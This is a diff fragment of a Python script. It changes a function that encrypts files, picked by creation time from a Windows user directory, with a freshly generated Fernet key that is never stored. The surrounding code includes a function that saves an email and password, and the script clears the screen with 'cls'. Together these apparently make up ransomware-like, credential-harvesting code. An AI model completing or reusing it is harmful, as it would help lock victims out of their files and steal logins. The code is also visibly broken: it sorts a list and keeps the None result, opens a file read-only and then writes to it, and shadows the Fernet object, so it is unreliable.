@@ -28,12 +28,17 @@ files_sorted = files.sort(key=lambda x: os.path.getctime(os.path.join(r"C:\\user
 
 numb_gen = random.randint(0,2000)
 
-def encryption(file):
-
+def encryption():
     key = Fernet.generate_key()
     f = Fernet(key)
-    file = files_sorted.encrypt(b"File encrypted successfully")
-    print("File encrypted, moving on...")
+    
+    with open(files_sorted, "rb") as f:
+        file_content = f.read()
+
+    file_encrypted = f.encrypt(file_content)
+
+    with open(files_sorted, "rb") as f:
+        f.write(file_encrypted)
 
 
 def saving_to_file(email, password):
@@ -96,4 +101,5 @@ def start():
 
 start()
 os.system("cls")
+
 
